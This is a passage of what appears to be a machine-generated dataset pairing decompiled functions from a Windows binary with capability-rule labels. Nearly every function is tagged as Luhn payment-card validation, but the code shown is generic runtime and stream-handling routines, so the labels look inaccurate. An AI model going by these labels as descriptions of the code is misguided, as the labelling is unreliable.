        "decompiled_code": "\nvoid __fastcall fcn.00419fcc(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x419fe4;\n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x419ff4;\n        fcn.0041a084();\n        uStack24 = 0x41a06c;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        (**(*in_EAX + 0x44))();\n        *(in_EAX + 1) = *(param_2 + 4);\n        *(in_EAX + 0xd) = *(param_2 + 0xd);\n        *(in_EAX + 3) = *(param_2 + 0xc);\n        *(in_EAX + 5) = *(param_2 + 5);\n        fcn.004054c0();\n        *(in_EAX + 0xe) = *(param_2 + 0xe);\n        (**(*in_EAX + 0x40))();\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x41a07d;\n        uStack24 = 0x41a06b;\n        fcn.0041a140();\n        return;\n    }\n    puStack20 = 0x41a07d;\n    fcn.00419bb8();\n    return;\n}\n",
        "token_count": 381
    },
    "0041a0f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a0f4(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = fcn.0041ac54;\n    fcn.0041a09c(&stack0xfffffffc);\n    (**(*param_2 + 4))(pcVar1);\n    return;\n}\n",
        "token_count": 95
    },
    "0041a154": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a154(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x41a1e9;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    iVar1 = (**(*in_EAX + 0x14))();\n    iVar2 = (**(*param_2 + 0x14))();\n    if ((iVar1 == iVar2) && (-1 < iVar1 + -1)) {\n        uVar3 = true;\n        do {\n            (**(*in_EAX + 0xc))();\n            (**(*param_2 + 0xc))(0);\n            fcn.00405894();\n            if (!uVar3) break;\n            iVar1 = iVar1 + -1;\n            uVar3 = iVar1 == 0;\n        } while (!uVar3);\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x41a1f0;\n    uStack44 = 0x41a1e8;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 342
    },
    "0041a200": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a200(uint param_1, uint param_2)\n\n{\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar auStack16 [4];\n    uchar uStack12;\n    \n    fcn.0041a1fc();\n    uStack12 = 0;\n    uStack52 = 0;\n    iStack48 = fcn.0040da34(0, auStack16);\n    if (iStack48 == 0) {\n        iStack48 = fcn.00405460();\n    }\n    uStack44 = param_2;\n    // WARNING: Could not recover jumptable at 0x00404ed5. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x4a6014)(0xeedfade, 1, 7, &uStack52);\n    return;\n}\n",
        "token_count": 199
    },
    "0041a290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041a290(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x41a36b;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x41a2be;\n    fcn.0041a084();\n    uStack52 = 0x41a346;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    (**(*in_EAX + 0xc))();\n    (**(*in_EAX + 0x18))();\n    (**(*in_EAX + 0xc))();\n    (**(*in_EAX + 0x20))();\n    (**(*in_EAX + 0x18))();\n    (**(*in_EAX + 0x24))();\n    (**(*in_EAX + 0x20))();\n    (**(*in_EAX + 0x24))();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x41a34d;\n    uStack52 = 0x41a345;\n    fcn.0041a140();\n    return;\n}\n",
        "token_count": 358
    },
    "0041a514": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041a514(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41a58c;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    iVar1 = (**(*in_EAX + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar2 = (**(*in_EAX + 0x34))();\n            if (iVar2 == 0) break;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41a593;\n    uStack36 = 0x41a58b;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 268
    },
    "0041a5a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a5a0(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_18h = 0;\n    var_14h = 0;\n    var_4h = 0;\n    uStack44 = 0x41a663;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    var_8h = param_2;\n    iVar1 = (**(*in_EAX + 0x14))();\n    if (-1 < iVar1 + -1) {\n        var_ch = 0;\n        var_10h = iVar1;\n        do {\n            (**(*in_EAX + 0xc))();\n            fcn.0041ad7c();\n            fcn.00405654();\n            iVar1 = fcn.0040e7c8();\n            if (iVar1 != 0) {\n                fcn.00405964(&fcn.0041a5a0::var_18h);\n                iVar1 = (**(*in_EAX + 0x34))();\n                if (iVar1 == 0) goto code_r0x0041a640;\n            }\n            var_ch = var_ch + 1;\n            var_10h = var_10h + -1;\n        } while (var_10h != 0);\n    }\n    var_ch = -1;\ncode_r0x0041a640:\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x41a66a;\n    uStack44 = 0x41a65a;\n    fcn.00405490();\n    uStack44 = 0x41a662;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 477
    },
    "0041a72c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a72c(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x41a7c9;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x41a754;\n    fcn.0041a084();\n    uStack40 = 0x41a7ac;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    (***param_2)();\n    fcn.0041b48c();\n    fcn.0040555c();\n    (**(*param_2 + 0xc))();\n    (**(*in_EAX + 0x2c))();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x41a7b3;\n    uStack40 = 0x41a7ab;\n    fcn.0041a140();\n    return;\n}\n",
        "token_count": 313
    },
    "0041a7d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a7d8(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x41a879;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (param_1 != param_2) {\n        puStack40 = 0x41a807;\n        fcn.0041a084();\n        uStack44 = 0x41a85c;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        puStack40 = &stack0xfffffffc;\n        (**(*in_EAX + 0xc))();\n        uVar1 = (**(*in_EAX + 0x18))();\n        (**(*in_EAX + 0x48))();\n        (**(*in_EAX + 100))();\n        *in_FS_OFFSET = uVar1;\n        uStack44 = 0x41a863;\n        uStack48 = 0x41a85b;\n        fcn.0041a140();\n        return;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41a880;\n    uStack32 = 0x41a878;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 377
    },
    "0041a8bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a8bc(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_ch = 0;\n    uStack24 = 0x41a960;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x41a8e3;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.0041d9f8();\n    puStack32 = 0x41a8eb;\n    fcn.0041a084();\n    uStack36 = 0x41a93b;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    (**(*var_4h + 0x44))();\n    while( true ) {\n        cVar1 = fcn.0041c944();\n        if (cVar1 != '\\0') break;\n        fcn.0041e728();\n        (**(*var_4h + 0x38))();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41a942;\n    uStack36 = 0x41a93a;\n    fcn.0041a140();\n    return;\n}\n",
        "token_count": 391
    },
    "0041b0cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041b0cc(void)\n\n{\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + 0x28))();\n    return;\n}\n",
        "token_count": 40
    },
    "0041b1a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b1a0(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    int32_t in_EDX;\n    \n    (**(*in_EAX + 0x84))();\n    if (in_EAX[7] == in_EAX[8]) {\n        fcn.0041b0cc();\n    }\n    if (in_EDX < in_EAX[7]) {\n        fcn.004030ec();\n    }\n    puVar1 = in_EAX[6] + in_EDX * 8;\n    *puVar1 = 0;\n    puVar1[1] = arg_8h;\n    fcn.004054c0();\n    in_EAX[7] = in_EAX[7] + 1;\n    (**(*in_EAX + 0x80))();\n    return;\n}\n",
        "token_count": 196
    },
    "0041b48c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041b48c(void)\n\n{\n    ulong uVar1;\n    int32_t *in_EAX;\n    \n    uVar1 = (**(*in_EAX + 0x18))(0, 0);\n    return uVar1;\n}\n",
        "token_count": 57
    },
    "0041b578": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041b578(uint arg_8h)\n\n{\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    fcn.00404520();\n    var_8h = &var_108h;\n    var_4h._0_1_ = 4;\n    fcn.0040daf0(0, &var_8h);\n    fcn.00404eb4();\n    return;\n}\n",
        "token_count": 115
    },
    "0041b81c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041b81c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStackY32;\n    uint uStackY28;\n    uchar *puStackY24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStackY24 = 0x41b838;\n    fcn.0041c090(0x1000);\n    uStackY28 = 0x41b86c;\n    uStackY32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStackY24 = &stack0xfffffffc;\n    fcn.0041e2d8();\n    *in_FS_OFFSET = uStackY32;\n    puStackY24 = 0x41b873;\n    uStackY28 = 0x41b86b;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 195
    },
    "0041b87c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041b87c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    *(in_EAX + 4) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 164
    },
    "0041b940": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041b940(uint32_t arg_8h)\n\n{\n    uint in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404964();\n        in_DL = extraout_DL;\n    }\n    uVar1 = 0;\n    fcn.0041b984(0, arg_8h & 0xffff);\n    if (in_DL != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 148
    },
    "0041bd84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041bd84(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    fcn.004054c0();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 137
    },
    "0041bee4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041bee4(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint noname_0;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404964();\n        in_DL = extraout_DL;\n    }\n    fcn.00404610();\n    noname_0 = 0;\n    fcn.004058fc();\n    fcn.0041bfdc(noname_0, arg_8h);\n    if (in_DL != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = noname_0;\n    }\n    return in_EAX;\n}\n",
        "token_count": 167
    },
    "0041c090": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041c090(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404964();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    uVar1 = fcn.00402ef0();\n    *(in_EAX + 8) = uVar1;\n    *(in_EAX + 0xc) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 208
    },
    "0041c1dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041c1dc(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404964();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 8) = arg_14h;\n    *(in_EAX + 0xc) = arg_10h;\n    fcn.004054c0();\n    fcn.004054c0();\n    if (in_DL != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 225
    },
    "0041c77c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041c77c(void)\n\n{\n    uchar auStack12 [4];\n    uchar uStack8;\n    \n    uStack8 = 0xb;\n    fcn.0040daf0(0, auStack12);\n    fcn.00404eb4();\n    return;\n}\n",
        "token_count": 65
    },
    "0041cc8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0041cc8c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    int32_t iStack20;\n    \n    iVar2 = fcn.00404518();\n    do {\n        if (iVar2 == *0x4172f4) {\n            if (*(in_EAX + 0x84) == 0) {\n                uVar4 = fcn.00418d1c();\n            }\n            else {\n                uVar4 = fcn.00418c1c();\n            }\n            return uVar4;\n        }\n        piVar3 = fcn.00418ca4();\n        if ((piVar3 != NULL) && (iVar2 = *piVar3,  -1 < iVar2 + -1)) {\n            iStack20 = 0;\n            do {\n                uVar4 = **(piVar3 + iStack20 * 2 + 1);\n                cVar1 = fcn.00404534();\n                if (cVar1 != '\\0') {\n                    return uVar4;\n                }\n                iStack20 = iStack20 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        iVar2 = fcn.004045cc();\n    } while( true );\n}\n",
        "token_count": 305
    },
    "0041ceb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041ceb8(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x41cecb;\n    (**(*param_2 + 0x20))();\n    uStack24 = 0x41cf58;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    cVar1 = fcn.0041c944();\n    if (cVar1 == '\\0') {\n        fcn.00419e34();\n    }\n    while( true ) {\n        cVar1 = fcn.0041c944();\n        if (cVar1 != '\\0') break;\n        cVar1 = fcn.0041cd3c();\n        if (cVar1 - 2U < 3) {\n            fcn.0041d948();\n        }\n        fcn.00419e14();\n        fcn.0041d9f8();\n        while( true ) {\n            cVar1 = fcn.0041c944();\n            if (cVar1 != '\\0') break;\n            fcn.0041db64();\n        }\n        fcn.0041da00();\n    }\n    fcn.0041da00();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41cf5f;\n    uStack24 = 0x41cf57;\n    (**(*param_2 + 0x24))();\n    return;\n}\n",
        "token_count": 376
    },
    "0041d628": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041d628(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    while( true ) {\n        puStack32 = 0x41d64a;\n        cVar3 = fcn.0041c944();\n        if (cVar3 != '\\0') break;\n        puStack32 = 0x41d642;\n        fcn.0041db64();\n    }\n    puStack32 = 0x41d656;\n    fcn.0041da00();\n    uVar1 = *(in_EAX + 0x2c);\n    uVar2 = *(in_EAX + 0x28);\n    puStack32 = 0x41d673;\n    uVar4 = fcn.0040483c();\n    *(in_EAX + 0x2c) = uVar4;\n    uStack36 = 0x41d6ea;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar5 = fcn.0040483c();\n    *(in_EAX + 0x28) = iVar5;\n    if (iVar5 == 0) {\n        *(in_EAX + 0x28) = *(in_EAX + 0x18);\n    }\n    while( true ) {\n        cVar3 = fcn.0041c944();\n        if (cVar3 != '\\0') break;\n        fcn.0041d378();\n    }\n    fcn.0041da00();\n    *in_FS_OFFSET = uStack40;\n    *(in_EAX + 0x2c) = uVar1;\n    *(in_EAX + 0x28) = uVar2;\n    return;\n}\n",
        "token_count": 464
    },
    "0041d730": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0041d730(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    double dStack20;\n    \n    cVar2 = fcn.0041e8c8();\n    if (cVar2 == '\\x15') {\n        fcn.0041cd60();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.0041d9b4();\n        dStack20 = iVar1;\n    }\n    return dStack20;\n}\n",
        "token_count": 139
    },
    "0041d774": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0041d774(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    float fStack16;\n    \n    cVar2 = fcn.0041e8c8();\n    if (cVar2 == '\\x0f') {\n        fcn.0041cd60();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.0041d9b4();\n        fStack16 = iVar1;\n    }\n    return fStack16;\n}\n",
        "token_count": 140
    },
    "0041d7b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0041d7b8(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int64_t iStack20;\n    \n    cVar2 = fcn.0041e8c8();\n    if (cVar2 == '\\x10') {\n        fcn.0041cd60();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.0041d9b4();\n        iStack20 = ROUND(iVar1 * *0x41d804);\n    }\n    return iStack20;\n}\n",
        "token_count": 152
    },
    "0041d808": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0041d808(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    double dStack20;\n    \n    cVar2 = fcn.0041e8c8();\n    if (cVar2 == '\\x11') {\n        fcn.0041cd60();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.0041d9b4();\n        dStack20 = iVar1;\n    }\n    return dStack20;\n}\n",
        "token_count": 139
    },
    "0041d948": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041d948(void)\n\n{\n    char cVar1;\n    int32_t iStack12;\n    char cStack8;\n    uchar uStack7;\n    int16_t iStack6;\n    \n    cVar1 = fcn.0041e8c8();\n    if (cVar1 == '\\x02') {\n        fcn.0041cd60();\n        iStack12 = cStack8;\n    }\n    else if (cVar1 == '\\x03') {\n        fcn.0041cd60();\n        iStack12 = iStack6;\n    }\n    else if (cVar1 == '\\x04') {\n        fcn.0041cd60();\n    }\n    else {\n        fcn.0041c770();\n    }\n    return CONCAT26(iStack6, CONCAT15(uStack7, CONCAT14(cStack8, iStack12)));\n}\n",
        "token_count": 190
    },
    "0041d9b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041d9b4(void)\n\n{\n    char cVar1;\n    int32_t iStack12;\n    int32_t iStack8;\n    \n    cVar1 = fcn.0041cd3c();\n    if (cVar1 == '\\x13') {\n        fcn.0041e8c8();\n        fcn.0041cd60();\n    }\n    else {\n        iStack12 = fcn.0041d948();\n        iStack8 = iStack12 >> 0x1f;\n    }\n    return CONCAT44(iStack8, iStack12);\n}\n",
        "token_count": 131
    },
    "0041ddbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041ddbc(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = fcn.00419004();\n    if ((pcVar2 != NULL) && (cVar1 = (*pcVar2)(),  cVar1 != '\\0')) {\n        fcn.0041645c();\n        return;\n    }\n    fcn.0041c770();\n    return;\n}\n",
        "token_count": 109
    },
    "0041e278": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e278(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004054c0();\n    while( true ) {\n        cVar1 = fcn.0041919c();\n        if (cVar1 != '\\0') break;\n        fcn.0040ae94(param_2);\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "0041e728": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041e728(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x41e7d5;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    cVar1 = fcn.0041cd3c();\n    if ((cVar1 == '\\x12') || (cVar1 == '\\x14')) {\n        fcn.0041e7e4();\n        fcn.004056f4();\n    }\n    else {\n        cVar1 = fcn.0041e8c8();\n        if (cVar1 == '\\x06') {\n            fcn.0041cd60();\n        }\n        else if (cVar1 == '\\f') {\n            fcn.0041cd60();\n        }\n        else {\n            fcn.0041c770();\n        }\n        fcn.00405b8c();\n        fcn.0041cd60();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x41e7dc;\n    uStack28 = 0x41e7d4;\n    fcn.00405c48();\n    return;\n}\n",
